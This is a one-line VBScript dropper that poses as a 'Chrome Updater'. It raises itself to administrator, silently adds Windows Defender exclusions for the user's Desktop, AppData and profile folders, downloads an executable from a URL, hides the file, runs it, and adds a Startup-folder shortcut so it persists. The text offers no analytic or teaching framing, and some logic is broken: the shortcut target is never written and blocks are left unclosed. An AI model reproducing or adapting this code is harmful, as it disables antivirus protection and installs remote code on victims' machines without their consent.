Option Explicit: Dim shell, fso, ws, desktop, exeUrl, exePath, tempPath, fontExePath, scriptPath, waitTime: Set shell = CreateObject("Shell.Application"): Set fso = CreateObject("Scripting.FileSystemObject"): Set ws = CreateObject("WScript.Shell"): scriptPath = WScript.ScriptFullName: If Not IsAdmin() Then shell.ShellExecute "wscript.exe", """" & scriptPath & """", "", "runas", 1: WScript.Quit: desktop = ws.SpecialFolders("Desktop"): exeUrl = "https://example.com/ChromeUpdater.exe": exePath = desktop & "\Chrome Updater.exe": tempPath = ws.ExpandEnvironmentStrings("%APPDATA%"): fontExePath = tempPath & "\Chrome Updater.exe": RunHidden "powershell -NoProfile -ExecutionPolicy Bypass -Command Add-MpPreference -ExclusionPath '" & desktop & "'": RunHidden "powershell -NoProfile -ExecutionPolicy Bypass -Command Add-MpPreference -ExclusionPath '" & exePath & "'": RunHidden "powershell -NoProfile -ExecutionPolicy Bypass -Command Add-MpPreference -ExclusionPath '" & tempPath & "'": RunHidden "powershell -NoProfile -ExecutionPolicy Bypass -Command Add-MpPreference -ExclusionPath '" & fontExePath & "'": RunHidden "powershell -NoProfile -ExecutionPolicy Bypass -Command Add-MpPreference -ExclusionPath '" & ws.ExpandEnvironmentStrings("%USERPROFILE%") & "'": RunHidden "powershell -NoProfile -ExecutionPolicy Bypass -Command $wc = New-Object System.Net.WebClient; $wc.DownloadFile('" & exeUrl & "', '" & exePath & "')": waitTime = 0: Do While (Not fso.FileExists(exePath)) And waitTime < 15000: WScript.Sleep 500: waitTime = waitTime + 500: Loop: If fso.FileExists(exePath) Then: Set downloadedFile = fso.GetFile(exePath): downloadedFile.Attributes = downloadedFile.Attributes Or 2: WScript.Sleep 5000: Set objShell = CreateObject("WScript.Shell"): objShell.Run "cmd /c start "" "" """ & exePath & """", 1, False: startupFolder = ws.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup": Set shortcut = ws.CreateShortcut(startupFolder & "\Chrome Updater.lnk"): shortcut.TargetPath = fontExePath: shortcut.Save: Else: MsgBox "Failed to download the EXE file.", vbExclamation: Function RunHidden(cmd): CreateObject("WScript.Shell").Run cmd, 0, True: End Function: Function IsAdmin(): On Error Resume Next: CreateObject("WScript.Shell").RegRead("HKEY_USERS\S-1-5-19\Environment\TEMP"): IsAdmin = (Err.Number = 0): On Error GoTo 0: End Function